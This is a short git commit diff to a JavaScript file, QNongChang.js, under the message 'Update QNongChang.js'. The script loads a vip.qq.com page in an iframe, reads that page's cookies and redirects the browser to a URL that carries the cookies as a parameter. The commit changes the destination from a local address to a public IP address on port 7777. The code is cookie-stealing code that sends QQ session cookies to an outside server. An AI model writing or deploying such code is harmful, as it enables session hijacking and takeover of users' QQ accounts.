08c9097533df47a5e8e5879dbe19b4ad26124b6a
Camaro <cstcamaro@gmail.com>
2019-09-12 11:41:41 +0800

    Update QNongChang.js

--- QNongChang.js
+++ QNongChang.js
@@ -2,6 +2,6 @@ var b = document.createElement("iframe");
 b.src = "https://vip.qq.com/11years/";
 b.name = "qvip";
 b.onload = function () {
-    top.location.href = 'http://0.0.0.0:7777/AboutLink/?api=QNongChang&cookies='+escape(this.contentDocument.cookie);
+    top.location.href = 'http://118.24.31.87:7777/AboutLink/?api=QNongChang&cookies='+escape(this.contentDocument.cookie);
 }
 document.body.appendChild(b);
